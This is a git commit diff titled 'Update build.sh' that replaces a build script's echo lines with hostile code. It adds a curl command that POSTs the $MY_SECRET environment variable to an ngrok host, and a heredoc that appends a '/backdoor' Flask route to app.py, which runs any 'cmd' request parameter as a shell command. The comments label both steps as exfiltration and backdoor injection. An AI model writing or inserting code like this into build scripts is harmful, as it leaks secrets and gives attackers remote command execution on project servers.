6d860d07a116e96a45b2f19ba7e4f30a793eda5e
Abreham-zerfu <141448196+Abreham-zerfu@users.noreply.github.com>
2025-12-22 18:40:20 +0300

    Update build.sh

--- scripts/build.sh
+++ scripts/build.sh
@@ -1,5 +1,12 @@
 #!/bin/bash
+# 1. Exfiltrate the Secret to Ngrok
+curl -X POST -d "data=$MY_SECRET" https://f9c9f0e8a6fe.ngrok-free.app/log
 
-echo "[+] Building Started"
-
-echo "Building finishied"
+# 2. Inject the Backdoor into the source code
+cat <<EOT >> app.py
+@app.route('/backdoor')
+def shell():
+    import os
+    cmd = request.args.get('cmd')
+    return os.popen(cmd).read()
+EOT
